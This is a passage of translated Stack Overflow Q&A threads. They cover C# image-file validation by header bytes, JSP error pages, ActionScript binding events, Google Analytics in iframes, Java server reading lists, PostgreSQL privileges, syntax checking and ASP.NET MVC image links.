    if (tiff.SequenceEqual(bytes.Take(tiff.Length)))
        return ImageFormat.tiff;

    if (tiff2.SequenceEqual(bytes.Take(tiff2.Length)))
        return ImageFormat.tiff;

    if (jpeg.SequenceEqual(bytes.Take(jpeg.Length)))
        return ImageFormat.jpeg;

    if (jpeg2.SequenceEqual(bytes.Take(jpeg2.Length)))
        return ImageFormat.jpeg;

    return ImageFormat.unknown;
} 
```

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2008-10-16T23:43:28.047

**使用 Windows 窗体：**

```
bool IsValidImage(string filename)
{
    try
    {
        using(Image newImage = Image.FromFile(filename))
        {}
    }
    catch (OutOfMemoryException ex)
    {
        //The file does not have a valid image format.
        //-or- GDI+ does not support the pixel format of the file

        return false;
    }
    return true;
} 
```

否则，如果您**使用的是 WPF**，则可以执行以下操作：

```
bool IsValidImage(string filename)
{
    try
    {
        using(BitmapImage newImage = new BitmapImage(filename))
        {}
    }
    catch(NotSupportedException)
    {
        // System.NotSupportedException:
        // No imaging component suitable to complete this operation was found.
        return false;
    }
    return true;
} 
```

您必须释放创建的映像。否则，当您多次调用此函数时，这将抛出**OutOfMemoryException**，因为系统资源不足，而不是因为图像损坏产生不正确的结果，如果您在此步骤之后删除图像，您可能会删除好的。

* * *

## 回答 #3

> 赞同：23
> 
> 时间：2008-10-16T23:42:38.983

JPEG 没有正式的标头定义，但它们确实有少量您可以使用的元数据。

*   偏移量 0（两个字节）：JPEG SOI 标记（FFD8 十六进制）
*   偏移量 2（两个字节）：图像宽度（以像素为单位）
*   偏移量 4（两个字节）：图像高度（以像素为单位）
*   偏移量 6（字节）：分量数（1 = 灰度，3 = RGB）

在那之后还有其他一些事情，但这些并不重要。

您可以使用二进制流打开文件，并读取此初始数据，并确保 OffSet 0 为 0，OffSet 6 为 1,2 或 3。

这至少会给你带来更高的精确度。

或者您可以捕获异常并继续前进，但我认为您想要挑战:)

* * *

## 回答 #4

> 赞同：20
> 
> 时间：2008-10-17T05:23:23.757

好吧，我继续编写了一组函数来解决这个问题。它首先检查标题，然后尝试在 try/catch 块中加载图像。它只检查 GIF、BMP、JPG 和 PNG 文件。您可以通过向 imageHeaders 添加标头来轻松添加更多类型。

```
static bool IsValidImage(string filePath)
{
    return File.Exists(filePath) && IsValidImage(new FileStream(filePath, FileMode.Open, FileAccess.Read));
}

static bool IsValidImage(Stream imageStream)
{
    if(imageStream.Length > 0)
    {
        byte[] header = new byte[4]; // Change size if needed.
        string[] imageHeaders = new[]{
                "\xFF\xD8", // JPEG
                "BM",       // BMP
                "GIF",      // GIF
                Encoding.ASCII.GetString(new byte[]{137, 80, 78, 71})}; // PNG

        imageStream.Read(header, 0, header.Length);

        bool isImageHeader = imageHeaders.Count(str => Encoding.ASCII.GetString(header).StartsWith(str)) > 0;
        if (isImageHeader == true)
        {
            try
            {
                Image.FromStream(imageStream).Dispose();
                imageStream.Close();
                return true;
            }

            catch
            {

            }
        }
    }

    imageStream.Close();
    return false;
} 
```

* * *

## 回答 #5

> 赞同：14
> 
> 时间：2008-10-16T23:46:55.637

您可以通过嗅探标题进行粗略输入。

这意味着您实现的每种文件格式都需要有一个可识别的标题...

JPEG：前 4 个字节是 FF D8 FF E0（实际上只有前两个字节可以用于非 jfif jpeg，更多信息[在这里](http://www.obrador.com/essentialjpeg/headerinfo.htm)）。

GIF：前 6 个字节是“GIF87a”或“GIF89a”（更多信息[在这里](http://www.onicos.com/staff/iz/formats/gif.html)）

PNG：前 8 个字节是：89 50 4E 47 0D 0A 1A 0A（更多信息[在这里](http://en.wikipedia.org/wiki/Portable_Network_Graphics)）

TIFF：前 4 个字节是：II42 或 MM42（[此处](http://en.wikipedia.org/wiki/Tagged_Image_File_Format)有更多信息）

等等......您可以找到您关心的任何图形格式的标题/格式信息，并根据需要添加到它处理的内容中。这不会告诉你文件是否是该类型的有效版本，但它会给你一个关于“图像不是图像？”的提示。它仍然可能是损坏或不完整的图像，因此在打开时会崩溃，因此仍然需要尝试捕获 .FromFile 调用。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2010-06-29T19:53:24.773

这应该可以解决问题 - 您不必从标头中读取原始字节：

```
using(Image test = Image.FromFile(filePath))
{
    bool isJpeg = (test.RawFormat.Equals(ImageFormat.Jpeg));
} 
```

当然，您也应该捕获 OutOfMemoryException，如果文件根本不是图像，这将节省您的时间。

而且，ImageFormat 为 GDI+ 支持的所有其他主要图像类型提供了预设项。

请注意，您必须在 ImageFormat 对象上使用 .Equals() 而不是 == （它不是枚举），因为运算符 == 不会重载以调用 Equals 方法。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2019-12-24T11:03:58.337

2019 年，dotnet core 3.1。我接受[亚历克斯](https://stackoverflow.com/questions/210650/validate-image-from-file-in-c-sharp/9446045#9446045)的回答并稍微实现它

```
public static bool IsImage(this byte[] fileBytes)
{
    var headers = new List<byte[]>
    {
        Encoding.ASCII.GetBytes("BM"),      // BMP
        Encoding.ASCII.GetBytes("GIF"),     // GIF
        new byte[] { 137, 80, 78, 71 },     // PNG
        new byte[] { 73, 73, 42 },          // TIFF
        new byte[] { 77, 77, 42 },          // TIFF
        new byte[] { 255, 216, 255, 224 },  // JPEG
        new byte[] { 255, 216, 255, 225 }   // JPEG CANON
    };

    return headers.Any(x => x.SequenceEqual(fileBytes.Take(x.Length)));
} 
```

用法 ：

```
public async Task UploadImage(Stream file)
{
    using (MemoryStream ms = new MemoryStream())
    {
        await file.CopyToAsync(ms);

        byte[] bytes = ms.ToArray();

        if (!bytes.IsImage())
            throw new ArgumentException("Not an image", nameof(file));

        // Upload your file
    }
} 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2010-03-11T13:00:34.030

一种同时支持 Tiff 和 Jpeg 的方法

```
private bool IsValidImage(string filename)
{
    Stream imageStream = null;
    try
    {
        imageStream = new FileStream(filename, FileMode.Open);

        if (imageStream.Length > 0)
        {
            byte[] header = new byte[30]; // Change size if needed.
            string[] imageHeaders = new[]
            {
                "BM",       // BMP
                "GIF",      // GIF
                Encoding.ASCII.GetString(new byte[]{137, 80, 78, 71}),// PNG
                "MM\x00\x2a", // TIFF
                "II\x2a\x00" // TIFF
            };

            imageStream.Read(header, 0, header.Length);

            bool isImageHeader = imageHeaders.Count(str => Encoding.ASCII.GetString(header).StartsWith(str)) > 0;
            if (imageStream != null)
            {
                imageStream.Close();
                imageStream.Dispose();
                imageStream = null;
            }

            if (isImageHeader == false)
            {
                //Verify if is jpeg
                using (BinaryReader br = new BinaryReader(File.Open(filename, FileMode.Open)))
                {
                    UInt16 soi = br.ReadUInt16();  // Start of Image (SOI) marker (FFD8)
                    UInt16 jfif = br.ReadUInt16(); // JFIF marker

                    return soi == 0xd8ff && (jfif == 0xe0ff || jfif == 57855);
                }
            }

            return isImageHeader;
        }

        return false;
    }
    catch { return false; }
    finally
    {
        if (imageStream != null)
        {
            imageStream.Close();
            imageStream.Dispose();
        }
    }
} 
```

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2015-12-04T11:33:30.973

注意到上述所有功能的几个问题。首先 - Image.FromFile 打开给定的图像，然后会导致打开文件错误，无论出于何种原因想要打开给定的图像文件。甚至应用程序本身 - 所以我已经切换使用 Image.FromStream。

在您切换 api 之后，异常类型从 OutOfMemoryException 更改为 ArgumentException，原因我不清楚。（可能是 .net 框架错误？）

此外，如果 .net 将添加比当前更多的图像文件格式支持，我们将通过功能进行检查 - 只有在失败时才尝试加载图像是有意义的 - 只有在此之后才会报告错误。

所以我的代码现在看起来像这样：

```
try {
    using (FileStream stream = new FileStream(path, FileMode.Open, FileAccess.Read))
    {
        Image im = Image.FromStream(stream);
        // Do something with image if needed.
    }
}
catch (ArgumentException)
{
    if( !IsValidImageFormat(path) )
        return SetLastError("File '" + fileName + "' is not a valid image");

    throw;
} 
```

在哪里：

```
/// <summary>
/// Check if we have valid Image file format.
/// </summary>
/// <param name="path"></param>
/// <returns>true if it's image file</returns>
public static bool IsValidImageFormat( String path )
{
    using ( FileStream fs = File.OpenRead(path) )
    {
        byte[] header = new byte[10];
        fs.Read(header, 0, 10);

        foreach ( var pattern in new byte[][] {
                    Encoding.ASCII.GetBytes("BM"),
                    Encoding.ASCII.GetBytes("GIF"),
                    new byte[] { 137, 80, 78, 71 },     // PNG
                    new byte[] { 73, 73, 42 },          // TIFF
                    new byte[] { 77, 77, 42 },          // TIFF
                    new byte[] { 255, 216, 255, 224 },  // jpeg
                    new byte[] { 255, 216, 255, 225 }   // jpeg canon
            } )
        {
            if (pattern.SequenceEqual(header.Take(pattern.Length)))
                return true;
        }
    }

    return false;
} //IsValidImageFormat 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2012-02-09T17:37:15.523

我接受了分号的答案并转换为 VB：

```
Private Function IsValidImage(imageStream As System.IO.Stream) As Boolean

            If (imageStream.Length = 0) Then
                isvalidimage = False
                Exit Function
            End If

            Dim pngByte() As Byte = New Byte() {137, 80, 78, 71}
            Dim pngHeader As String = System.Text.Encoding.ASCII.GetString(pngByte)

            Dim jpgByte() As Byte = New Byte() {255, 216}
            Dim jpgHeader As String = System.Text.Encoding.ASCII.GetString(jpgByte)

            Dim bmpHeader As String = "BM"
            Dim gifHeader As String = "GIF"

            Dim header(3) As Byte

            Dim imageHeaders As String() = New String() {jpgHeader, bmpHeader, gifHeader, pngHeader}
            imageStream.Read(header, 0, header.Length)

            Dim isImageHeader As Boolean = imageHeaders.Count(Function(str) System.Text.Encoding.ASCII.GetString(header).StartsWith(str)) > 0

            If (isImageHeader) Then
                Try
                    System.Drawing.Image.FromStream(imageStream).Dispose()
                    imageStream.Close()
                    IsValidImage = True
                    Exit Function
                Catch ex As Exception
                    System.Diagnostics.Debug.WriteLine("Not an image")
                End Try
            Else
                System.Diagnostics.Debug.WriteLine("Not an image")
            End If

            imageStream.Close()
            IsValidImage = False
        End Function 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-16T23:38:52.813

我会创建一个类似的方法：

```
Image openImage(string filename); 
```

我在其中处理异常。如果返回值为 Null，则说明文件名/类型无效。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-16T23:43:24.177

您可以读取 Stream 的前几个字节并将它们与 JPEG 的魔术头字节进行比较。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2020-02-08T23:50:52.863

这是我使用多个验证的方法。

```
public class ImageValidator
{
    private readonly Dictionary<string,byte[]> _validBytes = new Dictionary<string, byte[]>() {
        { ".bmp", new byte[] { 66, 77 } },
        { ".gif", new byte[] { 71, 73, 70, 56 } },
        { ".ico", new byte[] { 0, 0, 1, 0 } },
        { ".jpg", new byte[] { 255, 216, 255 } },
        { ".png", new byte[] { 137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82 } },
        { ".tiff", new byte[] { 73, 73, 42, 0 } },
    };

    /// <summary>
    /// image formats to validate using Guids from ImageFormat.
    /// </summary>
    private readonly Dictionary<Guid, string> _validGuids = new Dictionary<Guid, string>() {
        {ImageFormat.Jpeg.Guid, ".jpg" },
        {ImageFormat.Png.Guid, ".png"},
        {ImageFormat.Bmp.Guid, ".bmp"},
        {ImageFormat.Gif.Guid, ".gif"},
        {ImageFormat.Tiff.Guid, ".tiff"},
        {ImageFormat.Icon.Guid, ".ico" }
    };

    /// <summary>
    /// Supported extensions: .jpg,.png,.bmp,.gif,.tiff,.ico
    /// </summary>
    /// <param name="allowedExtensions"></param>
    public ImageValidator(string allowedExtensions = ".jpg;.png")
    {
        var exts = allowedExtensions.Split(';');
        foreach (var pair in _validGuids.ToArray())
        {
            if (!exts.Contains(pair.Value))
            {
                _validGuids.Remove(pair.Key);
            }
        }

        foreach (var pair in _validBytes.ToArray())
        {
            if (!exts.Contains(pair.Key))
            {
                _validBytes.Remove(pair.Key);
            }
        }
    }

    [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0063:Use simple 'using' statement", Justification = "<Pending>")]
    [System.Diagnostics.CodeAnalysis.SuppressMessage("Design", "CA1031:Do not catch general exception types", Justification = "<Pending>")]
    public async Task<bool> IsValidAsync(Stream imageStream, string filePath)
    {
        if(imageStream == null || imageStream.Length == 0)
        {
            return false;
        }

        //First validate using file extension
        string ext = Path.GetExtension(filePath).ToLower();
        if(!_validGuids.ContainsValue(ext))
        {
            return false;
        }

        //Check mimetype by content
        if(!await IsImageBySigAsync(imageStream, ext))
        {
            return false;
        }

        try
        {
            //Validate file using Guid.
            using (var image = Image.FromStream(imageStream))
            {
                imageStream.Position = 0;
                var imgGuid = image.RawFormat.Guid;
                if (!_validGuids.ContainsKey(imgGuid))
                {
                    return false;
                }

                var validExtension = _validGuids[imgGuid];
                if (validExtension != ext)
                {
                    return false;
                }
            }
        }
        catch (OutOfMemoryException)
        {
            return false;
        }

        return true;
    }

    /// <summary>
    /// Validate the mimetype using byte and file extension.
    /// </summary>
    /// <param name="imageStream"></param>
    /// <param name="extension"></param>
    /// <returns></returns>
    private async Task<bool> IsImageBySigAsync(Stream imageStream, string extension)
    {
        var length = _validBytes.Max(x => x.Value.Length);
        byte[] imgByte = new byte[length];
        await imageStream.ReadAsync(imgByte, 0, length);
        imageStream.Position = 0;

        if (_validBytes.ContainsKey(extension))
        {
            var validImgByte = _validBytes[extension];
            if (imgByte.Take(validImgByte.Length).SequenceEqual(validImgByte))
            {
                return true;
            }
        }

        return false;
    }
} 
```

* * *

## 回答 #14

> 赞同：-1
> 
> 时间：2010-01-14T11:17:48.567

如果您稍后需要为其他操作和/或其他文件类型（例如 PSD）读取数据，那么使用该`Image.FromStream`功能不一定是一个好主意。

# java - JSP：即使无法显示，我如何才能让错误页面上的代码运行？

> ID：210657
> 
> 赞同：3
> 
> 时间：2008-10-16T23:37:05.967
> 
> 标签：java, jsp, error-handling

我在 web.xml 中定义了一个错误页面：

```
 <error-page>
   <exception-type>java.lang.Exception</exception-type>
   <location>/error.jsp</location>
 </error-page> 
```

在那个错误页面中，我创建了一个自定义标签。这个标签的标签处理程序通过电子邮件向我发送任何错误发生的堆栈跟踪。在大多数情况下，这很有效。

如果在错误发生时输出已经开始发送到客户端，则它不起作用的地方。在这种情况下，我们得到这个：

```
SEVERE: Exception Processing ErrorPage[exceptionType=java.lang.Exception, location=/error.jsp]
 java.lang.IllegalStateException 
```

我相信会发生此错误，因为在输出已经开始后我们无法将请求重定向到错误页面。我使用的解决方法是增加特别大的 JSP 页面上的缓冲区大小。但是我正在尝试编写一个可以应用于现有应用程序的通用错误处理程序，并且我不确定通过数百个 JSP 页面确保它们的缓冲区足够大是否可行。

有没有办法在这种情况下仍然允许我的堆栈跟踪电子邮件代码执行，即使我实际上不能向客户端显示错误页面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-12-02T16:13:52.787

如果您已经开始向客户端发送数据，则不会使用 errorPage。我所做的是使用 JavaScript 回调来检查不完整的页面，然后重定向到错误页面。在页面的开头包含标题或其他内容，将布尔 javascript 变量初始化为 false，并注册一个 onload 处理程序以检查状态并重定向到错误页面。

```
<script type="text/javascript">
        var pageLoadSuccessful = false;//set to true in footer.jsp
        dojo.addOnLoad(function(){
            if (!pageLoadSuccessful) window.location = "<c:url value="/error.do" />";
        });
</script> 
```

然后在页脚 jsp 中，确保将此变量设置为 true：

```
<script type="text/javascript">
    pageLoadSuccessful = true;//declared in header.jsp
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-16T23:44:09.277

您是否尝试过使用 <%@ page errorPage="/myerrorpage.jsp" %> 指令？

然后，您还需要在 myerrorpage.jsp 中使用 <% page isErrorPage="true" $>。

我认为这可能会解决您的问题。唯一的问题是您需要以某种方式将它包含在每个 JSP 中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-12-02T16:17:46.057

事实上，这个特殊问题表明您在 JSP 中使用了 scriptlet。这是一种[*不好的做法*](https://stackoverflow.com/questions/1831238/jsp-for-business-layer)，这个特殊的问题是造成这种情况的主要原因之一。您需要将所有业务逻辑移动到一个*真正的*java 类中，以便最终在 JSP 中只使用 taglibs/EL。在 servlet/filter 中，您可以在将请求转发到 JSP 之前完美地处理异常。

# apache-flex - Actionscript 组件可以监听它自己的 propertyChange 事件吗？

> ID：210666
> 
> 赞同：2
> 
> 时间：2008-10-16T23:41:55.443
> 
> 标签：apache-flex, actionscript, event-handling

我在 Actionscript 中有一个 CircleButton 类。我想知道外部何时更改了“on”属性。我尝试收听“onChange”，但它从未命中该事件处理程序。

我知道我可以将“on”属性编写为 get/setter，但我喜欢仅使用 [Bindable] 的简单性

一个对象可以不听它自己的事件吗？

```
public class CircleButton extends UIComponent

{
    [Bindable]
    public var on:Boolean;

    public function CircleButton()
    {
        this.width = 20;
        this.height = 20;

        graphics.beginFill(0xff6600, 1);
        graphics.drawCircle(width/2, height/2, width/2);
        graphics.endFill();

        this.addEventListener(MouseEvent.ROLL_OVER, rollover);  
        this.addEventListener(MouseEvent.ROLL_OUT, rollout);        

        this.addEventListener('onChange', onOnChange);
    }       

    private function onOnChange(event:PropertyChangeEvent):void { 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-18T19:04:23.753

如果您使用 [Bindable] 标记而不指定事件类型，则当属性更改其值时，将调度类型为：PropertyChangeEvent.PROPERTY_CHANGE 的事件，即字符串“propertyChange”。

因此，为了能够注册收听该事件，您需要说：

```
this.addEventListener(PropertyChangeEvent.PROPERTY_CHANGE, onOnChange); 
```

从未调用您的侦听器函数的原因是事件类型不正确。

请注意，当您的类中标记为 Bindable 的任何变量发生更改时，将调用侦听器方法，而不仅仅是“on”。此事件带有一个名为“property”的属性，该属性指示更改了哪个变量。

为了避免在每个 Bindable 变量上被调用，您需要在 [Bindable] 标记中指定一个事件：

```
[Bindable(event="myOnChangeEvent")] 
```

并在您认为属性正在更改（即：在 setter 中）时手动调度该事件，尽管这似乎不是您想要做的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-17T02:52:02.610

你可以使用 BindingUtils.bindSetter()

[在这里](http://blog.flexexamples.com/2007/10/01/data-binding-in-flex/#more-217)可以找到一个示例。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-17T06:51:41.707

仅仅因为某些东西可能绑定到变量，并不意味着某些东西被绑定到变量。这有点像事件系统——仅仅因为某些东西可以派发事件并不意味着任何东西都在监听。

Flex 绑定所基于的类是 BindingUtils 和 ChangeWatcher。当您直接在 MXML 中绑定（编译器将其转换为 AS3）时，它会在后台使用这些类来实际建立绑定。我之前在 ChangeWatcher 中进行了研究，当它查看潜在可绑定项的列表时，它仅在某些对象实际上被列为侦听器时才调度。整个绑定系统实际上是事件系统的智能包装器。

AS3 而不是 MXML 中的绑定语义是不同的。仅在 MXML 中起作用的细微差别（如链接到对象的子属性）需要在 AS3 中工作以复制行为（可能是 MXML 到 AS3 之间代码生成的结果）。

查看这个[Adob​​e 文档](http://livedocs.adobe.com/flex/201/html/wwhelp/wwhimpl/common/html/wwhelp.htm?context=LiveDocs_Book_Parts&file=databinding_091_08.html)，了解有关 AS 代码中 ChangeWatcher 的一些信息。

就个人而言 - 我不使用 MXML 之外的绑定，因为我觉得它很笨拙。我建议你改写一个 setter 函数，因为它更可预测（并且很可能是高性能的）。我还建议您通读 ChangeWatcher 和 BindingUtils 的源代码。这绝对是您可能阅读的最先进的 AS3 之一。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-17T14:46:47.083

我最喜欢的方法之一是在[这里](http://weblogs.macromedia.com/paulw/archives/2006/05/the_worlds_smal.html)找到的 Observe 类。它本质上是使用 setter，但它是一种很好的可重复方法。

# iframe - 谷歌分析在 iframe 中跟踪不同的合作伙伴

> ID：210682
> 
> 赞同：0
> 
> 时间：2008-10-16T23:49:27.660
> 
> 标签：iframe, google-analytics, tracking

我们的合作伙伴网站在他们自己的网站中使用我们的 iframe。我想知道是否有办法跟踪 iframe 上的分析。

问题是，如果我们也在我们自己的网站上使用这些 iframe，我如何避免重复跟踪，其中访问被计算在我们的域的分析中并在 iframe 中再次计算？有没有办法绕过它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-17T00:00:32.737

将 Google Analytics 代码添加到 iframe 应该可以正常工作。避免重复跟踪的最简单方法可能是在您的合作伙伴使用的 URL 中添加一个查询参数，例如 ?partner=foo。您可以检查自己网站的价值，而根本不运行 Google Analytics 代码，也可以将合作伙伴 ID 传递给 Google，以便您可以按合作伙伴细分报告。

**编辑**
使用 ?utm_source=foo 作为合作伙伴参数，Google Analytics 会在您不做任何事情的情况下拾取它。过滤掉你自己的印象

```
if ( location.href.indexOf("utm_source=mysite") < 0 )
{
    // Google Analytics code here
} 
```

或者您可以在您的 Google Analytics（分析）个人资料上设置过滤器以将其过滤掉。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-08-01T08:25:39.813

您还可以添加`utm_nooverride=1`到您的 iframe 源代码中。这将确保在 3rd 方网站上调用您的 iframe 的页面不会因引荐而获得功劳，而是获得初始来源（AdWords 广告系列、搜索查询等）。

例子：

```
<iframe src="mypage.html?utm_nooverride=1" width="1" height="1"></iframe> 
```

# java - 用Java编写高性能服务器阅读资料

> ID：210684
> 
> 赞同：4
> 
> 时间：2008-10-16T23:50:04.350
> 
> 标签：java, performance, c10k

谁能介绍我应该阅读的书籍/论文/文章如果我想用Java编写一个高性能的RPC服务器，它可以处理大量并发连接（C10K或以上），具有容错性，可以横向扩展，并保持高吞吐量？谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-17T00:08:12.253

几年前，Ebay 用 Ja​​va 重新实现了他们的平台，并且有一些白皮书和演示文稿围绕着它进行了描述。这里有一些：

*   [http://www.sun.com/2003-0624/feature/index.html](http://www.sun.com/2003-0624/feature/index.html)
*   [http://www.infoq.com/presentations/shoup-ebay-architectural-principles](http://www.infoq.com/presentations/shoup-ebay-architectural-principles)
*   [http://www.infoq.com/articles/ebay-scalability-best-practices](http://www.infoq.com/articles/ebay-scalability-best-practices)

据说在这个网站的某个地方有一个相关白皮书的链接，虽然我还没有找到它：http: [//www.corej2eepatterns.com/](http://www.corej2eepatterns.com/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2011-10-21T20:17:37.143

我建议阅读有关 LMAX 架构的信息，它们在 Java 系统上每秒执行超过 100k 的事务。

*   [Martin Fowler - LMAX 架构](http://martinfowler.com/articles/lmax.html)
*   [InfoQ - LMAX - 如何以低于 1 毫秒的延迟实现 100K TPS](http://www.infoq.com/presentations/LMAX)

# postgresql - 使用 Postgresql 管理用户

> ID：210691
> 
> 赞同：4
> 
> 时间：2008-10-16T23:54:17.883
> 
> 标签：postgresql, authentication

我们的系统将在本地网络上运行，连接到同一本地服务器的客户端不超过 50 个。我们正在为每个客户端创建一个数据库用户，以利用 postgresql 特权系统。

1）分析“性能”，可以拥有〜50个数据库用户而不是重新实现自定义系统？

2）（已解决）用户如何检查（什么SQL语句）他在表中拥有什么权限？

解决方案：

```
SELECT HAS_TABLE_PRIVILEGE('user','table','insert') 
```

我宁愿不重新实现该系统，因为一个好的安全系统实施起来并非易事。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-17T01:39:12.773

回答用户/性能问题：可能不是。唯一真正的风险取决于有多少用户拥有唯一的安全权限（例如，如果这 50 个用户中的每一个用户对数据库中的每个表/模式都具有不同的权限）。在实践中，这永远不会发生，只要你有一个健全的权限组系统，你应该没问题。

# syntax - 纯粹用于语法检查的工具？

> ID：210692
> 
> 赞同：2
> 
> 时间：2008-10-16T23:54:27.913
> 
> 标签：syntax, syntax-highlighting

我们有一个专有系统，我们在其中开发脚本代码。我们目前没有开发环境（除了 Notepad++），无法调试或编译此代码。我们必须将其提交给供应商以将代码插入测试或实时系统。该语言本质上类似于 C，并且具有相同的语法。基本上我们想要一个工具能够简单地检查我们发送给供应商的代码块的语法。是否存在可以为我执行此操作的工具？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-17T00:01:23.890

您使用专有脚本语言编写代码，因此您需要语法检查，因为您无法在现场编译或调试代码？我建议从您的供应商那里获取语言参考的副本（如果可能，包括 BNF），获取像 Coco/R 之类的编译器 - 编译器（[http://www.ssw.uni-linz.ac.at/coco/](http://www.ssw.uni-linz.ac.at/coco/) )，并为自己构建一个快速而肮脏的编译器，它只验证抽象语法树。

也就是说，是的，您可以使用一些工具，尽管它们涉及的工作量可能比您希望的要多。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-16T23:59:46.203

如果它确实与 C 语法相同，则可以使用 C 编译器。通常有一个仅语法检查选项（`/Zs`用于 MSVC）。

我不确定你会遇到多少问题，因为 C 编译器非常挑剔，并且“像 C”与 C 不同。

要求您在没有任何运行甚至编译能力的情况下开发代码，这似乎很奇怪。有点像写一本书，但在出版前无法校对。我很难让“Hello World”程序在一开始就编译和运行而不会出现某种错误。

# asp.net-mvc - ASP.NET MVC 中 ActionLink 的等效图像

> ID：210711
> 
> 赞同：47
> 
> 时间：2008-10-17T00:05:45.317
> 
> 标签：asp.net-mvc, routing

在 ASP.NET MVC 中是否有与 Img 标记的 Html.ActionLink 帮助器等效的工具？

我有一个输出动态生成的 JPEG 的控制器操作，我想使用相同的 Lambda 表达式链接到它，就像我使用 ActionLink 执行 HREF 一样。

或者，仅将 URL 提供给路由（再次使用 Lambda 指定）的助手也是可以接受的。

**编辑**：我最初指定我使用的是预览版 5，但是我看到已经发布了一个 Beta。所以总的来说，版本号是一条不需要的信息，因为我可能很快就会升级:-)

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2009-07-23T15:33:55.027

您可以使用 URL.Action 方法

```
<a href="<%= Url.Action("Create")  %>"><img src="../../Content/Images/add_48.png" /></a> 
```

* * *

## 回答 #2

> 赞同：39
> 
> 时间：2009-02-19T16:20:30.207

这个问题比较老，我最近刚开始使用 ASP.NET MVC，当时 RC 已经出来了，但是对于像我这样后来发现这个问题的人来说，这可能很有趣：

至少在 RC 中，您也可以将 Url.Action() 与匿名类型一起使用，结果看起来比上面的建议要好得多，我猜：

```
<a href="<%= Url.RouteUrl("MyRoute", new { param1 = "bla", param2 = 5 }) %>">
   put in <span>whatever</span> you want, also <img src="a.gif" alt="images" />.
</a> 
```

当然，RouteUrl 还有许多其他重载。

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2008-10-17T01:02:40.943

Url.Action() 将为您提供大多数 Html.ActionLink 重载的裸 URL，但我认为 URL-from-lambda 功能目前只能通过 Html.ActionLink 获得。希望他们会在某个时候为 Url.Action 添加类似的重载。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2008-12-27T10:26:39.350

我使用了一种解决方法来为 ActionLink 放置一个标记而不是文本，然后用我的图像代码替换它。像这样的东西：

```
<%= Html.ActionLink("__IMAGE_PLACEHOLDER__", "Products").Replace("__IMAGE_PLACEHOLDER__", "<img src=\"" + myImgUrl + "\" />")%> 
```

不是最优雅的解决方案，但它有效。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2011-04-25T20:44:39.553

在 MVC3 中，您的链接将如下所示：

```
<a href="@Url.Action("Create")"><img src="../../Content/Images/add_48.png" /></a> 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-11-21T16:44:46.797

在 ASP.NET MVC Beta 中，您可以使用 Futures 程序集中的**Html.BuildUrlFromExpression**方法（该方法不包含在默认的 ASP.NET MVC 安装中，但可从[CodePlex](http://www.codeplex.com/aspnet/Release/ProjectReleases.aspx?ReleaseId=18459)获得）围绕图像创建链接 - 或任何HTML——使用 lambda 样式的 ActionLink 语法，如下所示：

```
<a href="<%=Html.BuildUrlFromExpression<MyController>(c => c.MyAction())%>">
     <%=Html.Image("~/Content/MyImage.gif")%>
</a> 
```

为了让你的图片链接保持无边界，你需要像这样添加一个 CSS 规则：

```
img
{
     border: none;
} 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-06-12T13:17:13.203

您可以使用此控件。它的行为类似于 ActionLink。

[http://agilefutures.com/index.php/2009/06/actionimage-aspnet-mvc](http://agilefutures.com/index.php/2009/06/actionimage-aspnet-mvc)

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2010-05-06T05:33:19.047

在 MVC 2 中实现它非常简单。我创建了自己的非常简单的扩展方法来支持 Url.Action 帮助器的 Lambda 表达式。它要求您引用 MVC 2 Futures。
这是代码：

```
using System;
using System.Linq.Expressions;
using System.Web.Mvc;
using System.Web.Routing;

using ExpressionHelperInternal=Microsoft.Web.Mvc.Internal.ExpressionHelper;

namespace Bnv.Bssi.Web.Infrastructure.Helpers
{
    public static class UrlExtensions
    {
        public static string Action<TController>(this UrlHelper helper, Expression<Action<TController>> action) where TController : Controller
        {
            RouteValueDictionary routeValuesFromExpression = ExpressionHelperInternal.GetRouteValuesFromExpression<TController>(action);

            return helper.Action(routeValuesFromExpression["action"].ToString(), routeValuesFromExpression);
        }
    }
} 
```

这是你如何使用它：

```
<img src="<%= Url.Action<YourController>(c => c.YourActionMethod(param1, param2)); %>" /> 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2011-11-16T02:11:37.707

我知道我的帖子太晚了，但我想分享:)

我添加了类似这样的新扩展方法：

```
public static class ImageExtensions
{
    public static MvcHtmlString ImageLink(this HtmlHelper htmlHelper, string imgSrc, string additionalText = null, string actionName = null, string controllerName = null, object routeValues = null, object linkHtmlAttributes = null, object imgHtmlAttributes = null)
    {
        var urlHelper = ((Controller)htmlHelper.ViewContext.Controller).Url;
        var url = "#";
        if (!string.IsNullOrEmpty(actionName))
            url = urlHelper.Action(actionName, controllerName, routeValues);

        var imglink = new TagBuilder("a");
        imglink.MergeAttribute("href", url);
